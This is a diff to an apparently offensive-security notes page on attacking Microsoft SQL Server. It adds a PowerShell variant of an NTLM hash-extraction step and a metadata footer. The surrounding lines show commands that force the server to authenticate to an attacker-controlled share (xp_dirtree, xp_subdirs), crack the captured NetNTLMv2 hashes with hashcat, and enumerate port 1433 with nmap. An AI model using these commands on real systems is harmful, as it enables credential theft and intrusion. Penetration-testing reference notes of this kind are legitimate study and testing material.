@@ -211,9 +211,11 @@ EXEC master..xp_subdirs '\\<attacker_ip>\share\';
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 # Alternative: capture via Wireshark/tcpdump pcap then extract with NTLMRawUnHide
-python3 NTLMRawUnHide.py -i capture.pcap -o hashes.txt
+python3 NTLMRawUnHide.py -i capture.pcap -o hashes.txt          # or the PS7 fork on Windows: .\NTLMRawUnHide.ps1 -i capture.etl -o hashes.txt
 hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
+
+Tool note (Python original + PowerShell 7 fork, capture→extract workflow): [[Tools/Network/NTLMRawUnHide|NTLMRawUnHide]].
 
 ### Impersonation
 
@@ -363,3 +365,9 @@ WHERE ob.name = 'xp_instance_regread';
 | NTLM theft | `EXEC xp_dirtree '\\attacker\share'` |
 | Crack NTLMv2 | `hashcat -m 5600 hash.txt rockyou.txt` |
 | Nmap enum | `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password` |
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-08-14*
+*Model: claude-opus-5*
